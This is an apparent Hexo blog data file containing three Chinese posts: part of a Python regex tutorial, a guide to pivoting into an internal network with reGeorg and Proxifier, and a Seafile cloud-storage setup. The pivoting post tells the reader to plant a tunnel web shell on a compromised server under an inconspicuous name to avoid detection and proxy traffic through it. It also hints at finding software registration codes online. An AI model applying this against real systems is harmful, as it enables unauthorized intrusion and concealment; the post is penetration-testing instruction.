class=\"string\">r'^\\d&#123;6&#125;$'</span>,<span class=\"string\">'123456\\n'</span>) !=<span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"comment\">#python不支持\\z,python的\\Z等价于其他语言的\\z</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'\\A\\d&#123;6&#125;\\Z'</span>,<span class=\"string\">'123456'</span>) !=<span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'\\A\\d&#123;6&#125;\\Z'</span>,<span class=\"string\">'123456\\n'</span>) !=<span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/008.png\" alt=\"008\"></p>\n<h3 id=\"替换时不会被替代\"><a href=\"#替换时不会被替代\" class=\"headerlink\" title=\"替换时不会被替代\"></a>替换时不会被替代</h3><p>看下面用例,可以处理文本格式。</p>\n<h4 id=\"替换\"><a href=\"#替换\" class=\"headerlink\" title=\"替换\"></a>替换</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">\"line1\\nline2\\nline3\"</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> str</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?m)$'</span>,<span class=\"string\">'&lt;/p&gt;'</span>,re.sub(<span class=\"string\">r'(?m)^'</span>,<span class=\"string\">'&lt;p&gt;'</span>,str))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/009.png\" alt=\"009\"></p>\n<h4 id=\"处理行首尾空白字符\"><a href=\"#处理行首尾空白字符\" class=\"headerlink\" title=\"处理行首尾空白字符\"></a>处理行首尾空白字符</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">\"  begin\\n between\\t\\n\\nend \"</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> str</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?m)^\\s+'</span>,<span class=\"string\">''</span>,re.sub(<span class=\"string\">r'(?m)\\s+$'</span>,<span class=\"string\">''</span>,str))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/010.png\" alt=\"010\"></p>\n<h3 id=\"环视\"><a href=\"#环视\" class=\"headerlink\" title=\"环视\"></a>环视</h3><p>这部分概念有些多，但是结合实际例子还是很好理解的。</p>\n<h4 id=\"环视分类\"><a href=\"#环视分类\" class=\"headerlink\" title=\"环视分类\"></a>环视分类</h4><table>\n<thead>\n<tr>\n<th align=\"center\">名字</th>\n<th align=\"center\">记法</th>\n<th align=\"center\">判断方向</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">肯定顺序环视</td>\n<td align=\"center\">（?=…）</td>\n<td align=\"center\">向右</td>\n</tr>\n<tr>\n<td align=\"center\">否定顺序环视</td>\n<td align=\"center\">（?!…）</td>\n<td align=\"center\">向右</td>\n</tr>\n<tr>\n<td align=\"center\">肯定逆序环视</td>\n<td align=\"center\">（?&lt;=…）</td>\n<td align=\"center\">向左</td>\n</tr>\n<tr>\n<td align=\"center\">否定逆序环视</td>\n<td align=\"center\">（?&lt;!…）</td>\n<td align=\"center\">向左</td>\n</tr>\n</tbody></table>\n<p>总结一下：</p>\n<ol>\n<li><p>向右看就叫顺序，向左就叫逆序，这和现代人的阅读方向是一致的。</p>\n</li>\n<li><p>肯定是要匹配的字符串，否定是排除的字符串</p>\n</li>\n<li><p>肯定：<code>=</code>，否定：<code>！</code>，顺序：<code>没有&lt;</code> ，逆序：<code>&lt;</code></p>\n</li>\n</ol>\n<h4 id=\"例1\"><a href=\"#例1\" class=\"headerlink\" title=\"例1\"></a>例1</h4><p>将，添加到右侧字符串是3的倍数处。即12345，变成12,345</p>\n   <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?=\\d&#123;3&#125;)'</span>,<span class=\"string\">','</span>,<span class=\"string\">'12345'</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/011.png\" alt=\"011\"></p>\n<p>产生这个原因是环视的特性：原地执行。可以把<code>12345</code>看成<code>01020304050</code>，（0表示位置，不是表示数字。）现在我处在第一个0的位置，右边存在3个数字，满足正则，因此将第一处<code>0</code>替换为<code>，</code>，在下一个0位置同理。</p>\n<p>改进</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"comment\">#利用+(?!\\d)匹配到字符串尾</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?=(\\d&#123;3&#125;)+(?!\\d))'</span>,<span class=\"string\">','</span>,<span class=\"string\">'123456789'</span>)</span><br><span class=\"line\"><span class=\"comment\">#改进3的倍数时首部插入，</span></span><br><span class=\"line\">  <span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?&lt;=\\d)(?=(\\d&#123;3&#125;)+(?!\\d))'</span>,<span class=\"string\">','</span>,<span class=\"string\">'123456789'</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/012.png\" alt=\"012\"></p>\n<h4 id=\"例2\"><a href=\"#例2\" class=\"headerlink\" title=\"例2\"></a>例2</h4><p>去除中英文混排</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'中 英文混排, some English word, 有多余的空 白字符'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?&lt;![a-zA-Z])\\s+(?![a-zA-Z])'</span>,<span class=\"string\">''</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/013.png\" alt=\"013\"></p>\n<h4 id=\"环视结构不影响引用分组\"><a href=\"#环视结构不影响引用分组\" class=\"headerlink\" title=\"环视结构不影响引用分组\"></a>环视结构不影响引用分组</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.search(<span class=\"string\">r'(?!=ab)(cd)'</span>,<span class=\"string\">'abcd'</span>).group(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.search(<span class=\"string\">r'(?!=ab)(cd)'</span>,<span class=\"string\">'abcd'</span>).group(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/014.png\" alt=\"014\"></p>\n<p>环视的用法还很多，这里不能一一列举了。</p>\n<h2 id=\"匹配模式\"><a href=\"#匹配模式\" class=\"headerlink\" title=\"匹配模式\"></a>匹配模式</h2><h3 id=\"模式修饰符\"><a href=\"#模式修饰符\" class=\"headerlink\" title=\"模式修饰符\"></a>模式修饰符</h3><p>python中用<code>（？i）</code>来实现不去区分大小写模式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">re.search(<span class=\"string\">r'(?i)the'</span>,<span class=\"string\">'The'</span>) != <span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'(?i)the'</span>,<span class=\"string\">'the'</span>) != <span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'(?i)the'</span>,<span class=\"string\">'THE'</span>) != <span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"预订义常量\"><a href=\"#预订义常量\" class=\"headerlink\" title=\"预订义常量\"></a>预订义常量</h3><p>python：re.I （预定义常量在不同语言中写法不同）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">re.search(<span class=\"string\">r'the'</span>,<span class=\"string\">'The'</span>,re.I) != <span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'the'</span>,<span class=\"string\">'the'</span>,re.I) != <span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'the'</span>,<span class=\"string\">'THE'</span>,re.I) != <span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/016.png\" alt=\"016\"></p>\n<h3 id=\"常见匹配模式表格（python）\"><a href=\"#常见匹配模式表格（python）\" class=\"headerlink\" title=\"常见匹配模式表格（python）\"></a>常见匹配模式表格（python）</h3><table>\n<thead>\n<tr>\n<th align=\"center\">模式</th>\n<th align=\"center\">模式修饰符用法</th>\n<th align=\"center\">预定义常量</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">单行模式</td>\n<td align=\"center\">(?s)</td>\n<td align=\"center\">re.S和re.DOTALL</td>\n<td align=\"center\">s（Single line) ，单行模式解决的是.不能代表换行符的问题</td>\n</tr>\n<tr>\n<td align=\"center\">多行模式</td>\n<td align=\"center\">（?m）</td>\n<td align=\"center\">re.M和re.MULTILINE</td>\n<td align=\"center\">使^和$能匹配每行的行首和行尾</td>\n</tr>\n<tr>\n<td align=\"center\">不分大小写</td>\n<td align=\"center\">（?i）</td>\n<td align=\"center\">re.I</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">注释模式</td>\n<td align=\"center\">（?x）</td>\n<td align=\"center\">re.X和re.VERBOSE</td>\n<td align=\"center\">comment是注释的内容</td>\n</tr>\n<tr>\n<td align=\"center\">多行模式:</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">mstr = <span class=\"string\">'1 line\\nNot digit\\n2 line'</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> re.findall(<span class=\"string\">r'(?m)^\\d.*'</span>,mstr):</span><br><span class=\"line\">    <span class=\"keyword\">print</span> line</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/017.png\" alt=\"017\"></p>\n<h3 id=\"作用范围\"><a href=\"#作用范围\" class=\"headerlink\" title=\"作用范围\"></a>作用范围</h3><table>\n<thead>\n<tr>\n<th align=\"center\">正则</th>\n<th align=\"center\">匹配文本</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">t(?i)ht</td>\n<td align=\"center\">tHE the thE tHe</td>\n</tr>\n<tr>\n<td align=\"center\">th(?i)e</td>\n<td align=\"center\">thE the</td>\n</tr>\n<tr>\n<td align=\"center\">t((?i)h)e</td>\n<td align=\"center\">tHe the</td>\n</tr>\n<tr>\n<td align=\"center\">t(?i:h)e</td>\n<td align=\"center\">tHe the</td>\n</tr>\n</tbody></table>\n<p>总结：</p>\n<ol>\n<li>放在开头全局起作用</li>\n<li>放在中间对后部分起作用</li>\n<li>在括号内仅对括号范围起作用</li>\n</ol>\n"},{"title":"reGeorg+Proxifier渗透内网","date":"2019-06-19T14:58:24.000Z","_content":"\n# reGeorg+Proxifier渗透内网\n\n## 0x00 前言\n\n渗透测试中拿到了一台Web服务器之后发现这台主机可以访问内网，可能还会进行内网渗透。这时候就需要通过这台主机来进行内网渗透，但是通过这台机器去渗透内网又需要上传很多工具，会很麻烦。这时可以把在这台服务器作为一个跳板，利用代理使我们访问内网。\n\n## 0x02 工具\n\n1. reGeory\n\n   [reGeory](https://github.com/sensepost/reGeorg)是GitHub上的一个开源项目：https://github.com/sensepost/reGeorg\n\n   主要由两部分组成：tunnel的各类脚本和reGeorgSocksProxy.py文件\n\n2. Proxifier\n\n   Proxifier能让原本不支持代理的程序走我们设置的代理，类似于一个socks客户端。\n\n   下载地址：https://www.proxifier.com\n\n   有MacOS版本和Windows版，注册码网上搜索。\n\n## 0x03 使用\n\n#### **配置 reGeorg**\n\n1. 根据环境将tunnel.xxx上传到靶机的Web目录中，tunnel.xxx可解析后访问url检查下是否正常。(一般情况下将原本的文件改成个隐蔽的名字防止被发现)\n\n   - 访问正常，显示Georg says, ‘All seems fine’。\n   - 访问异常，根据报错信息检查，一般情况下是敏感函数被拦截了。\n2. 本地执行命令\n```\npython reGeorgSocksProxy.py -p xxxx -u http://:www.xxx.com/xxx/xxx/tunnel.xxx\n-p 指定本地代理的端口\n-u 上传脚本的url\n```\n\n正常的截图如下：\n\n![001](/img/reGeorg_Proxifier/001.png)\n\n\n#### **配置Proxifier**\n\n1. 在代理选项卡中添加本地代理的端口，我这里设置的是8088\n\n![002](/img/reGeorg_Proxifier/002.png)\n\n2. 配置需要代理的软件\n\n以firefox为例，先去掉本地直连的勾选\n\n![003](/img/reGeorg_Proxifier/003.png)\n\n添加firefox软件走代理\n\n![004](/img/reGeorg_Proxifier/004.png)\n\n到这一步就完成了，我们本机能访问内网了。","source":"_posts/reGeorg+Proxifier渗透内网.md","raw":"---\ntitle: reGeorg+Proxifier渗透内网\ndate: 2019-06-19 22:58:24\ntags: [内网渗透]\n---\n\n# reGeorg+Proxifier渗透内网\n\n## 0x00 前言\n\n渗透测试中拿到了一台Web服务器之后发现这台主机可以访问内网，可能还会进行内网渗透。这时候就需要通过这台主机来进行内网渗透，但是通过这台机器去渗透内网又需要上传很多工具，会很麻烦。这时可以把在这台服务器作为一个跳板，利用代理使我们访问内网。\n\n## 0x02 工具\n\n1. reGeory\n\n   [reGeory](https://github.com/sensepost/reGeorg)是GitHub上的一个开源项目：https://github.com/sensepost/reGeorg\n\n   主要由两部分组成：tunnel的各类脚本和reGeorgSocksProxy.py文件\n\n2. Proxifier\n\n   Proxifier能让原本不支持代理的程序走我们设置的代理，类似于一个socks客户端。\n\n   下载地址：https://www.proxifier.com\n\n   有MacOS版本和Windows版，注册码网上搜索。\n\n## 0x03 使用\n\n#### **配置 reGeorg**\n\n1. 根据环境将tunnel.xxx上传到靶机的Web目录中，tunnel.xxx可解析后访问url检查下是否正常。(一般情况下将原本的文件改成个隐蔽的名字防止被发现)\n\n   - 访问正常，显示Georg says, ‘All seems fine’。\n   - 访问异常，根据报错信息检查，一般情况下是敏感函数被拦截了。\n2. 本地执行命令\n```\npython reGeorgSocksProxy.py -p xxxx -u http://:www.xxx.com/xxx/xxx/tunnel.xxx\n-p 指定本地代理的端口\n-u 上传脚本的url\n```\n\n正常的截图如下：\n\n![001](/img/reGeorg_Proxifier/001.png)\n\n\n#### **配置Proxifier**\n\n1. 在代理选项卡中添加本地代理的端口，我这里设置的是8088\n\n![002](/img/reGeorg_Proxifier/002.png)\n\n2. 配置需要代理的软件\n\n以firefox为例，先去掉本地直连的勾选\n\n![003](/img/reGeorg_Proxifier/003.png)\n\n添加firefox软件走代理\n\n![004](/img/reGeorg_Proxifier/004.png)\n\n到这一步就完成了，我们本机能访问内网了。","slug":"reGeorg+Proxifier渗透内网","published":1,"updated":"2019-06-19T16:52:09.291Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istce001g4dsbmciwxaxs","content":"<h1 id=\"reGeorg-Proxifier渗透内网\"><a href=\"#reGeorg-Proxifier渗透内网\" class=\"headerlink\" title=\"reGeorg+Proxifier渗透内网\"></a>reGeorg+Proxifier渗透内网</h1><h2 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h2><p>渗透测试中拿到了一台Web服务器之后发现这台主机可以访问内网，可能还会进行内网渗透。这时候就需要通过这台主机来进行内网渗透，但是通过这台机器去渗透内网又需要上传很多工具，会很麻烦。这时可以把在这台服务器作为一个跳板，利用代理使我们访问内网。</p>\n<h2 id=\"0x02-工具\"><a href=\"#0x02-工具\" class=\"headerlink\" title=\"0x02 工具\"></a>0x02 工具</h2><ol>\n<li><p>reGeory</p>\n<p><a href=\"https://github.com/sensepost/reGeorg\" target=\"_blank\" rel=\"noopener\">reGeory</a>是GitHub上的一个开源项目：<a href=\"https://github.com/sensepost/reGeorg\" target=\"_blank\" rel=\"noopener\">https://github.com/sensepost/reGeorg</a></p>\n<p>主要由两部分组成：tunnel的各类脚本和reGeorgSocksProxy.py文件</p>\n</li>\n<li><p>Proxifier</p>\n<p>Proxifier能让原本不支持代理的程序走我们设置的代理，类似于一个socks客户端。</p>\n<p>下载地址：<a href=\"https://www.proxifier.com\" target=\"_blank\" rel=\"noopener\">https://www.proxifier.com</a></p>\n<p>有MacOS版本和Windows版，注册码网上搜索。</p>\n</li>\n</ol>\n<h2 id=\"0x03-使用\"><a href=\"#0x03-使用\" class=\"headerlink\" title=\"0x03 使用\"></a>0x03 使用</h2><h4 id=\"配置-reGeorg\"><a href=\"#配置-reGeorg\" class=\"headerlink\" title=\"配置 reGeorg\"></a><strong>配置 reGeorg</strong></h4><ol>\n<li><p>根据环境将tunnel.xxx上传到靶机的Web目录中，tunnel.xxx可解析后访问url检查下是否正常。(一般情况下将原本的文件改成个隐蔽的名字防止被发现)</p>\n<ul>\n<li>访问正常，显示Georg says, ‘All seems fine’。</li>\n<li>访问异常，根据报错信息检查，一般情况下是敏感函数被拦截了。</li>\n</ul>\n</li>\n<li><p>本地执行命令</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python reGeorgSocksProxy<span class=\"selector-class\">.py</span> -<span class=\"selector-tag\">p</span> xxxx -u http:<span class=\"comment\">//:www.xxx.com/xxx/xxx/tunnel.xxx</span></span><br><span class=\"line\">-<span class=\"selector-tag\">p</span> 指定本地代理的端口</span><br><span class=\"line\">-u 上传脚本的url</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>正常的截图如下：</p>\n<p><img src=\"/img/reGeorg_Proxifier/001.png\" alt=\"001\"></p>\n<h4 id=\"配置Proxifier\"><a href=\"#配置Proxifier\" class=\"headerlink\" title=\"配置Proxifier\"></a><strong>配置Proxifier</strong></h4><ol>\n<li>在代理选项卡中添加本地代理的端口，我这里设置的是8088</li>\n</ol>\n<p><img src=\"/img/reGeorg_Proxifier/002.png\" alt=\"002\"></p>\n<ol start=\"2\">\n<li>配置需要代理的软件</li>\n</ol>\n<p>以firefox为例，先去掉本地直连的勾选</p>\n<p><img src=\"/img/reGeorg_Proxifier/003.png\" alt=\"003\"></p>\n<p>添加firefox软件走代理</p>\n<p><img src=\"/img/reGeorg_Proxifier/004.png\" alt=\"004\"></p>\n<p>到这一步就完成了，我们本机能访问内网了。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"reGeorg-Proxifier渗透内网\"><a href=\"#reGeorg-Proxifier渗透内网\" class=\"headerlink\" title=\"reGeorg+Proxifier渗透内网\"></a>reGeorg+Proxifier渗透内网</h1><h2 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h2><p>渗透测试中拿到了一台Web服务器之后发现这台主机可以访问内网，可能还会进行内网渗透。这时候就需要通过这台主机来进行内网渗透，但是通过这台机器去渗透内网又需要上传很多工具，会很麻烦。这时可以把在这台服务器作为一个跳板，利用代理使我们访问内网。</p>\n<h2 id=\"0x02-工具\"><a href=\"#0x02-工具\" class=\"headerlink\" title=\"0x02 工具\"></a>0x02 工具</h2><ol>\n<li><p>reGeory</p>\n<p><a href=\"https://github.com/sensepost/reGeorg\" target=\"_blank\" rel=\"noopener\">reGeory</a>是GitHub上的一个开源项目：<a href=\"https://github.com/sensepost/reGeorg\" target=\"_blank\" rel=\"noopener\">https://github.com/sensepost/reGeorg</a></p>\n<p>主要由两部分组成：tunnel的各类脚本和reGeorgSocksProxy.py文件</p>\n</li>\n<li><p>Proxifier</p>\n<p>Proxifier能让原本不支持代理的程序走我们设置的代理，类似于一个socks客户端。</p>\n<p>下载地址：<a href=\"https://www.proxifier.com\" target=\"_blank\" rel=\"noopener\">https://www.proxifier.com</a></p>\n<p>有MacOS版本和Windows版，注册码网上搜索。</p>\n</li>\n</ol>\n<h2 id=\"0x03-使用\"><a href=\"#0x03-使用\" class=\"headerlink\" title=\"0x03 使用\"></a>0x03 使用</h2><h4 id=\"配置-reGeorg\"><a href=\"#配置-reGeorg\" class=\"headerlink\" title=\"配置 reGeorg\"></a><strong>配置 reGeorg</strong></h4><ol>\n<li><p>根据环境将tunnel.xxx上传到靶机的Web目录中，tunnel.xxx可解析后访问url检查下是否正常。(一般情况下将原本的文件改成个隐蔽的名字防止被发现)</p>\n<ul>\n<li>访问正常，显示Georg says, ‘All seems fine’。</li>\n<li>访问异常，根据报错信息检查，一般情况下是敏感函数被拦截了。</li>\n</ul>\n</li>\n<li><p>本地执行命令</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python reGeorgSocksProxy<span class=\"selector-class\">.py</span> -<span class=\"selector-tag\">p</span> xxxx -u http:<span class=\"comment\">//:www.xxx.com/xxx/xxx/tunnel.xxx</span></span><br><span class=\"line\">-<span class=\"selector-tag\">p</span> 指定本地代理的端口</span><br><span class=\"line\">-u 上传脚本的url</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>正常的截图如下：</p>\n<p><img src=\"/img/reGeorg_Proxifier/001.png\" alt=\"001\"></p>\n<h4 id=\"配置Proxifier\"><a href=\"#配置Proxifier\" class=\"headerlink\" title=\"配置Proxifier\"></a><strong>配置Proxifier</strong></h4><ol>\n<li>在代理选项卡中添加本地代理的端口，我这里设置的是8088</li>\n</ol>\n<p><img src=\"/img/reGeorg_Proxifier/002.png\" alt=\"002\"></p>\n<ol start=\"2\">\n<li>配置需要代理的软件</li>\n</ol>\n<p>以firefox为例，先去掉本地直连的勾选</p>\n<p><img src=\"/img/reGeorg_Proxifier/003.png\" alt=\"003\"></p>\n<p>添加firefox软件走代理</p>\n<p><img src=\"/img/reGeorg_Proxifier/004.png\" alt=\"004\"></p>\n<p>到这一步就完成了，我们本机能访问内网了。</p>\n"},{"title":"seafile个人云盘搭建","date":"2018-11-08T15:14:59.000Z","_content":"\n# seafile个人云盘搭建\n\n## 0x01 seafile \n\n`https://github.com/haiwen/seafile`\n\n![001](/img/seafile/001.png)\n\n解决的问题:文件同步\n\n![002](/img/seafile/002.png)\n\n## 0x02 搭建\n\n`https://github.com/helloxz/seafile`\n\n![003](/img/seafile/003.png)\n\n`http://144.202.127.105:8000/d/6aefa7d9d5124d28ba59/#`\n\n![004](/img/seafile/004.png)\n\n![005](/img/seafile/005.png)\n\n![006](/img/seafile/006.png)\n\n![007](/img/seafile/007.png)\n\n![008](/img/seafile/008.png)\n\n![009](/img/seafile/009.png)\n\n## 0x03 升级\n\n`https://github.com/neroxps/seafile-server-upgrade`\n\n![010](/img/seafile/010.png)\n\n1. 下载脚本到 seafile 程序目录(之前安装的Mycloud目录)\n\n\n\n   ```\n   wget https://raw.githubusercontent.com/neroxps/seafile-server-upgrade/master/seafile_upgrade.sh\n   ```\n\n   ![011](/img/seafile/011.png)\n\n2.  使用root权限运行脚本\n\n   ```\n   sudo chmod +x seafile_upgrade.sh\n   sudo ./seafile_upgrade.sh\n   #可能还需要\n   ./seafile_upgrade.sh -no_backup\n   ```\n\n   ![012](/img/seafile/012.png)\n\n![013](/img/seafile/013.png)\n\n```\n#重启服务\n./seafile.sh start\n./seahub.sh start\n```\n\n![014](/img/seafile/014.png)","source":"_posts/seafile个人云盘搭建.md","raw":"---\ntitle: seafile个人云盘搭建\ndate: 2018-11-08 23:14:59\ntags: [杂项]\ncategories: [杂项]\n---\n\n# seafile个人云盘搭建\n\n## 0x01 seafile \n\n`https://github.com/haiwen/seafile`\n\n![001](/img/seafile/001.png)\n\n解决的问题:文件同步\n\n![002](/img/seafile/002.png)\n\n## 0x02 搭建\n\n`https://github.com/helloxz/seafile`\n\n![003](/img/seafile/003.png)\n\n`http://144.202.127.105:8000/d/6aefa7d9d5124d28ba59/#`\n\n![004](/img/seafile/004.png)\n\n![005](/img/seafile/005.png)\n\n![006](/img/seafile/006.png)\n\n![007](/img/seafile/007.png)\n\n![008](/img/seafile/008.png)\n\n![009](/img/seafile/009.png)\n\n## 0x03 升级\n\n`https://github.com/neroxps/seafile-server-upgrade`\n\n![010](/img/seafile/010.png)\n\n1. 下载脚本到 seafile 程序目录(之前安装的Mycloud目录)\n\n\n\n   ```\n   wget https://raw.githubusercontent.com/neroxps/seafile-server-upgrade/master/seafile_upgrade.sh\n   ```\n\n   ![011](/img/seafile/011.png)\n\n2.  使用root权限运行脚本\n\n   ```\n   sudo chmod +x seafile_upgrade.sh\n   sudo ./seafile_upgrade.sh\n   #可能还需要\n   ./seafile_upgrade.sh -no_backup\n   ```\n\n   ![012](/img/seafile/012.png)\n\n![013](/img/seafile/013.png)\n\n```\n#重启服务\n./seafile.sh start\n./seahub.sh start\n```\n\n![014](/img/seafile/014.png)","slug":"seafile个人云盘搭建","published":1,"updated":"2019-06-19T17:23:13.384Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcg001j4dsbteoce7iy","content":"<h1 id=\"seafile个人云盘搭建\"><a href=\"#seafile个人云盘搭建\" class=\"headerlink\" title=\"seafile个人云盘搭建\"></a>seafile个人云盘搭建</h1><h2 id=\"0x01-seafile\"><a href=\"#0x01-seafile\" class=\"headerlink\" title=\"0x01 seafile\"></a>0x01 seafile</h2><p><code>https://github.com/haiwen/seafile</code></p>\n<p><img src=\"/img/seafile/001.png\" alt=\"001\"></p>\n<p>解决的问题:文件同步</p>\n<p><img src=\"/img/seafile/002.png\" alt=\"002\"></p>\n<h2 id=\"0x02-搭建\"><a href=\"#0x02-搭建\" class=\"headerlink\" title=\"0x02 搭建\"></a>0x02 搭建</h2><p><code>https://github.com/helloxz/seafile</code></p>\n<p><img src=\"/img/seafile/003.png\" alt=\"003\"></p>\n<p><code>http://144.202.127.105:8000/d/6aefa7d9d5124d28ba59/#</code></p>\n<p><img src=\"/img/seafile/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/seafile/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/seafile/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/seafile/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/seafile/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/seafile/009.png\" alt=\"009\"></p>\n<h2 id=\"0x03-升级\"><a href=\"#0x03-升级\" class=\"headerlink\" title=\"0x03 升级\"></a>0x03 升级</h2><p><code>https://github.com/neroxps/seafile-server-upgrade</code></p>\n<p><img src=\"/img/seafile/010.png\" alt=\"010\"></p>\n<ol>\n<li>下载脚本到 seafile 程序目录(之前安装的Mycloud目录)</li>\n</ol>\n   <figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https:<span class=\"regexp\">//</span>raw.githubusercontent.com<span class=\"regexp\">/neroxps/</span>seafile-server-upgrade<span class=\"regexp\">/master/</span>seafile_upgrade.sh</span><br></pre></td></tr></table></figure>\n\n<p>   <img src=\"/img/seafile/011.png\" alt=\"011\"></p>\n<ol start=\"2\">\n<li><p>使用root权限运行脚本</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chmod +x seafile_upgrade.sh</span><br><span class=\"line\">sudo ./seafile_upgrade.sh</span><br><span class=\"line\">#可能还需要</span><br><span class=\"line\">./seafile_upgrade<span class=\"selector-class\">.sh</span> -no_backup</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/seafile/012.png\" alt=\"012\"></p>\n</li>\n</ol>\n<p><img src=\"/img/seafile/013.png\" alt=\"013\"></p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#重启服务</span><br><span class=\"line\">./seafile<span class=\"selector-class\">.sh</span> start</span><br><span 